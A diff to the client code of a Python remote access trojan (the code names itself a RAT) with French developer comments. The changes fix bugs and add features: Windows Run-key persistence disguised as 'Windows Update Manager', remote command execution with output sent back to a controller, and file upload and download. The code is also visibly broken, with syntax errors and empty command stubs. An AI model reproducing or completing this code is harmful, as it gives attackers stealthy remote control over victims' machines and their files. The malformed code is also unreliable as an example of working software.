@@ -35,7 +35,7 @@ key = ""                     #Encryption key (16 characters) use the same on ser
 
 
 
-#Functions
+###Functions###
 #send message to server
 def send(msg):
     soc.send(encrypt(key, msg))
@@ -44,7 +44,7 @@ def send(msg):
 def getSystemOs():
 	plat = sys.platform
     if plat.startswith('win'):
-	    plat = 'win'
+        plat = 'win'
     elif plat.startswith('linux'):
         plat = 'nix'
     elif plat.startswith('darwin'):
@@ -103,7 +103,7 @@ def execute():
             stderr=subprocess.PIPE,
             stdout=subprocess.PIPE)
         out = process.stdout.read() + process.stderr.read()
-        send(out)
+        send(encrypt(key, out))
         process.kill
 
 def uninstall():
@@ -132,10 +132,11 @@ def download():
     received = ""
     received = soc.recv(4096)
     received = decrypt(key, received)
-    name_file = received[0].split(\) #only for a file from windows|for file from linux used .split(/) #pk [-1]? plutot [0] non?
+    #name_file = received[0].split(\) #only for a file from windows|for file from linux used .split(/) #pk [-1]? plutot [0] non?
+    name_file = received[0] #contain path to paste not just file name
     size = received[1]
     while continue:
-        received = soc.recb(4096)
+        received = soc.recv(4096)
         i += 1
         if received == b"Upload finished":
             i = 0
@@ -190,7 +191,21 @@ def upload(path_file):
 
 ###Program###
 def main():
-    #verify if the key is in the registers to automaticaly start this RAT
+    ##Get system os
+    
+    plat = sys.platform
+    if plat.startswith('win'):
+        plat = 'win'
+    elif plat.startswith('linux'):
+        plat = 'nix'
+    elif plat.startswith('darwin'):
+        plat = 'mac'
+    else:
+        plat = 'unk'
+
+        
+    ##verify if the key is in the registers to automaticaly start this RAT
+    
     if plat == 'win':
         run_key = r'Software\Microsoft\Windows\CurrentVersion\Run'
         try:
@@ -200,7 +215,7 @@ def main():
             while winreg.EnumValue(reg_key, i) != key_name:
                 key_name = winreg.EnumValue(reg_key, i)       #des lignes pour rien
                 i += 1                                        #bcp de lignes pour rien...
-                if key_name[1] == "Windows Update Manager":
+                if key_name[0] == "Windows Update Manager":
                     indic = 1
                     break
             if indic == 1:
@@ -216,7 +231,9 @@ def main():
     if plat == "unk":
         #device not yet supported
 
-    #try connecting to the server
+        
+    ##try connecting to the server
+    
 	soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     host = socket.gethostname()
     #soc.bind((host, port)) #not necessary ?
@@ -228,8 +245,12 @@ def main():
         except:
             sleepTime = random.randint(20, 30)
             time.sleep(sleepTime)
-
-	#receive and execute orders
+            
+    #Send plat
+    soc.send(encrypt(key, plat))
+    
+	##receive and execute orders
+    
     while True:
         #receive order
         msg = soc.recv(4096)
@@ -243,12 +264,13 @@ def main():
         if msg[0] == "download":
             download()
         if msg[0] == "upload":
-            upload(path_file)
-        if msg[0] == :
-            
-        if msg[0] == :
-            
-        if msg[0] == :
+            upload(msg[1])
+#        if msg[0] == :
+ #           
+  #      if msg[0] == :
+   #         
+    #    if msg[0] == :
+
             
 
 if __name__ == "__main__":
@@ -257,6 +279,6 @@ if __name__ == "__main__":
     
     
     
-#quand message envoyé 
-#destinataire envoie message confirmation avant que les programmes ne puissent continuer
+#quand message envoyé ?
+#destinataire envoie message confirmation avant que les programmes ne puissent continuer?
 
